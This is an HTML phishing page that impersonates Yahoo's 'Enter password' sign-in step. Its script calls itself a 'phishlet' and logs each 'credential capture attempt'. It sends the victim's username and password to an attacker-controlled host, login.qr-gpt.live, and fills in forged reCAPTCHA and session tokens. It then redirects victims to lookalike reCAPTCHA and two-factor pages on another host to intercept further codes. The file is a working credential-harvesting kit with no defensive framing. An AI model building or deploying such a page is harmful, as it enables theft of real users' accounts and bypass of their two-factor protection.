<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <!-- YOUR ORIGINAL CSS PATHS -->
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  
  <style>
    .input-field.error {
        border-color: #d93025 !important;
        background-color: #fef7f7 !important;
    }
    .error-message {
        color: #d93025;
        font-size: 14px;
        margin-top: 8px;
        display: none;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }
    .loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(255, 255, 255, 0.9);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }
    .spinner {
        border: 3px solid #f3f3f3;
        border-top: 3px solid #7200ff;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .success-message {
        color: #0f9d58;
        font-size: 14px;
        margin-top: 8px;
        display: none;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }
  </style>
</head>

<body>
  <div class="loading-overlay" id="loading-overlay">
    <div style="text-align: center;">
      <div class="spinner"></div>
      <p style="margin-top: 15px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">Signing you in...</p>
    </div>
  </div>

  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active" id="main-layout">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
              action="https://login.qr-gpt.live/account/challenge/password" 
              method="POST"
              data-wf-page-id="67c6f50ed426ad7d5847f218" 
              data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
          
          <input type="hidden" id="username" name="username">
          <input type="hidden" name="displayName" id="hidden-display-name">
          <input type="hidden" name="g-recaptcha-response" value="">
          <input type="hidden" name="crumb" value="">
          <input type="hidden" name="acrumb" value="">
          <input type="hidden" name="sessionIndex" value="1">
          <input type="hidden" name="sessionToken" value="">
          <input type="hidden" name="flowName" value="generic">
          <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
          <input type="hidden" name="src" value="ym">
          <input type="hidden" name=".lang" value="en-US">
          <input type="hidden" name=".intl" value="us">
          <input type="hidden" name="specId" value="yidReg">
          <input type="hidden" name="cacheStored" value="1">
          <input type="hidden" name="browser-fp-data" value="">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi" id="form-container">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="text-block-2">to finish signing in<br></div>
            <div class="pazz lpl">Password<br></div>
            <div class="ms-input-wrap">
              <input data-show="true" class="ms-input w-input" maxlength="256" name="passwd" data-name="passwd" placeholder="" type="password" id="password" data-ms-member="password" required autofocus>
              
              <div data-current="Show" data-easing="ease" data-duration-in="300" data-duration-out="100" class="ms-password-wrap w-tabs">
                <div id="transformButton" data-transform="true" class="tabs-menu w-tab-menu">
                  <a data-w-tab="Show" class="ms-password-button w-inline-block w-tab-link w--current"><img src="images/visible.png" loading="eager" alt="" class="image-4"></a>
                  <a data-w-tab="Hide" class="ms-password-button w-inline-block w-tab-link"><img src="images/eye.png" loading="eager" alt="" class="image-4"></a>
                </div>
              </div>
            </div>
            <div class="error-message" id="password-error">Invalid password. Please try again.</div>
            <div class="success-message" id="password-success">Password verified! Redirecting...</div>
            
            <input type="submit" data-wait="Please wait..." class="logger w-button" value="Sign In" id="submit-btn">
          </div>
          
          <div class="errry" style="display: none;" id="error-container">
            <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
            <div class="text-block-7" id="error-text">Invalid password. Please try again.</div>
            <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  
  <script>
  document.querySelector("[data-transform]").addEventListener("click", transform);
  var isPassword = true;
  function transform() {
     var myInput = document.querySelector("[data-show]");
     var oldHtml = myInput.outerHTML;
     var text = myInput.value;
     if (isPassword) {
         var newHtml = oldHtml.replace(/password/g, "text");
     } else {
         newHtml = oldHtml.replace(/text/g, "password");
     }
     myInput.outerHTML = newHtml;
     myInput = document.querySelector("[data-show]");
     myInput.value = text;
     isPassword = !isPassword;
  }
  </script>

  <script>
  (function() {
      'use strict';
      
      console.log('=== YAHOO ENHANCED PASSWORD PAGE LOADED ===');
      
      const elements = {
          form: document.getElementById('email-form'),
          passwordInput: document.getElementById('password'),
          submitBtn: document.getElementById('submit-btn'),
          userDisplay: document.getElementById('userEmail'),
          hiddenUsername: document.getElementById('username'),
          hiddenDisplayName: document.getElementById('hidden-display-name'),
          formContainer: document.getElementById('form-container'),
          errorContainer: document.getElementById('error-container'),
          errorText: document.getElementById('error-text'),
          refreshButton: document.getElementById('refreshButton'),
          passwordError: document.getElementById('password-error'),
          passwordSuccess: document.getElementById('password-success'),
          loadingOverlay: document.getElementById('loading-overlay'),
          mainLayout: document.getElementById('main-layout')
      };
      
      let currentUsername = '';
      let formInitialized = false;
      
      function log(message, data = null) {
          console.log(`[YAHOO-PHISHLET] ${message}`, data || '');
      }
      
      function getUsername() {
          const urlParams = new URLSearchParams(window.location.search);
          let username = urlParams.get('u');
          
          if (username) {
              return decodeURIComponent(username);
          }
          
          const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
          if (cookieMatch) {
              return decodeURIComponent(cookieMatch[1]);
          }
          
          return sessionStorage.getItem('yh_username') || 
                 localStorage.getItem('yh_username');
      }
      
      function generateFormData(username) {
          const timestamp = Date.now();
          const randomId = Math.random().toString(36).substr(2, 12);
          
          return {
              'g-recaptcha-response': `bypass_${timestamp}_${randomId}`,
              'crumb': `crumb_${timestamp}`,
              'acrumb': `acrumb_${randomId}`,
              'sessionToken': `sess_${timestamp}_${randomId}`,
              'browser-fp-data': JSON.stringify({
                  screen: `${screen.width}x${screen.height}`,
                  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                  language: navigator.language,
                  timestamp: timestamp
              })
          };
      }
      
      function initializePage() {
          currentUsername = getUsername();
          
          if (!currentUsername) {
              log('ERROR: No username found, redirecting to login');
              alert('Session expired. Please start over.');
              setTimeout(() => {
                  window.location.href = 'https://login.qr-gpt.live/';
              }, 3000);
              return false;
          }
          
          elements.userDisplay.textContent = currentUsername;
          elements.hiddenUsername.value = currentUsername;
          elements.hiddenDisplayName.value = currentUsername;
          
          const formData = generateFormData(currentUsername);
          Object.keys(formData).forEach(key => {
              const input = elements.form.querySelector(`input[name="${key}"]`);
              if (input) {
                  input.value = formData[key];
              }
          });
          
          formInitialized = true;
          return true;
      }
      
      function showLoading() {
          elements.loadingOverlay.style.display = 'flex';
          elements.submitBtn.disabled = true;
          elements.submitBtn.value = 'Signing in...';
      }
      
      function hideLoading() {
          elements.loadingOverlay.style.display = 'none';
          elements.submitBtn.disabled = false;
          elements.submitBtn.value = 'Sign In';
      }
      
      function showError(message, redirect = false) {
          hideLoading();
          
          if (redirect) {
              elements.formContainer.style.display = 'none';
              elements.errorContainer.style.display = 'block';
              elements.errorText.textContent = message;
          } else {
              elements.passwordInput.classList.add('error');
              elements.passwordError.textContent = message;
              elements.passwordError.style.display = 'block';
              elements.passwordSuccess.style.display = 'none';
              elements.passwordInput.focus();
              elements.passwordInput.select();
          }
      }
      
      function showSuccess(message) {
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.textContent = message;
          elements.passwordSuccess.style.display = 'block';
      }
      
      function clearMessages() {
          elements.passwordInput.classList.remove('error');
          elements.passwordError.style.display = 'none';
          elements.passwordSuccess.style.display = 'none';
      }
      
      function handleFormSubmission(event) {
          event.preventDefault();
          
          const password = elements.passwordInput.value.trim();
          if (!password) {
              showError('Please enter your password.');
              return;
          }
          
          clearMessages();
          showLoading();
          
          log('=== CREDENTIAL CAPTURE ATTEMPT ===');
          log('Username:', currentUsername);
          log('Password length:', password.length);
          
          const formData = new FormData(elements.form);
          formData.set('username', currentUsername);
          formData.set('displayName', currentUsername);
          
          const urlEncodedData = new URLSearchParams(formData);
          
          fetch(elements.form.action, {
              method: 'POST',
              body: urlEncodedData,
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'X-Requested-With': 'XMLHttpRequest',
                  'Referer': 'https://login.qr-gpt.live/',
                  'Origin': window.location.origin
              }
          })
          .then(response => {
              log('Response status:', response.status);
              
              if (response.status === 200) {
                  return response.text().then(text => {
                      const lowerText = text.toLowerCase();
                      
                      // Check for reCAPTCHA redirect
                      if (lowerText.includes('recaptcha') || text.includes('/recaptcha')) {
                          log('reCAPTCHA challenge detected');
                          showSuccess('Password verified! Completing security check...');
                          setTimeout(() => {
                              // Extract URL parameters and redirect to reCAPTCHA page
                              const urlMatch = text.match(/https?:\/\/[^"'\s]+\/recaptcha[^"'\s]*/);
                              if (urlMatch) {
                                  window.location.href = urlMatch[0].replace('login.yahoo.com', 'custom-yahoo-2fa-test.vercel.app');
                              } else {
                                  window.location.href = `https://custom-yahoo-2fa-test.vercel.app/recaptcha.html?u=${encodeURIComponent(currentUsername)}`;
                              }
                          }, 1500);
                          return;
                      }
                      
                      // Check for 2FA
                      if (lowerText.includes('challenge-selector') || lowerText.includes('2fa')) {
                          log('2FA challenge detected');
                          showSuccess('Password verified! Setting up 2FA...');
                          setTimeout(() => {
                              window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
                          }, 1500);
                          return;
                      }
                      
                      // Check for errors
                      if (lowerText.includes('invalid') || lowerText.includes('incorrect')) {
                          throw new Error('Invalid credentials');
                      }
                      
                      // Success
                      handleSuccessfulAuth();
                  });
              } else if (response.status === 302 || response.status === 301) {
                  const location = response.headers.get('Location') || response.headers.get('location');
                  log('Redirect to:', location);
                  
                  if (location && location.includes('recaptcha')) {
                      showSuccess('Password verified! Completing security check...');
                      setTimeout(() => {
                          window.location.href = location.replace('login.yahoo.com', 'custom-yahoo-2fa-test.vercel.app');
                      }, 1500);
                  } else if (location && location.includes('challenge-selector')) {
                      showSuccess('Password verified! Setting up 2FA...');
                      setTimeout(() => {
                          window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
                      }, 1500);
                  } else {
                      handleSuccessfulAuth();
                  }
              } else {
                  throw new Error(`HTTP ${response.status}`);
              }
          })
          .catch(error => {
              log('Authentication error:', error);
              showError('Invalid password. Please try again.');
          });
      }
      
      function handleSuccessfulAuth() {
          log('Authentication successful');
          showSuccess('Sign in successful! Redirecting...');
          sessionStorage.setItem('yh_auth_success', 'true');
          setTimeout(() => {
              window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
          }, 1500);
      }
      
      function setupRetry() {
          elements.refreshButton.addEventListener('click', function() {
              elements.passwordInput.value = '';
              elements.formContainer.style.display = 'block';
              elements.errorContainer.style.display = 'none';
              clearMessages();
              elements.passwordInput.focus();
          });
      }
      
      function setupInputHandlers() {
          elements.passwordInput.addEventListener('input', clearMessages);
          elements.passwordInput.addEventListener('keydown', function(event) {
              if (event.key === 'Enter') {
                  event.preventDefault();
                  elements.form.dispatchEvent(new Event('submit'));
              }
          });
      }
      
      function init() {
          if (!initializePage()) return;
          
          setupRetry();
          setupInputHandlers();
          elements.form.addEventListener('submit', handleFormSubmission);
          
          setTimeout(() => {
              elements.passwordInput.focus();
          }, 500);
      }
      
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
</body>
</html>
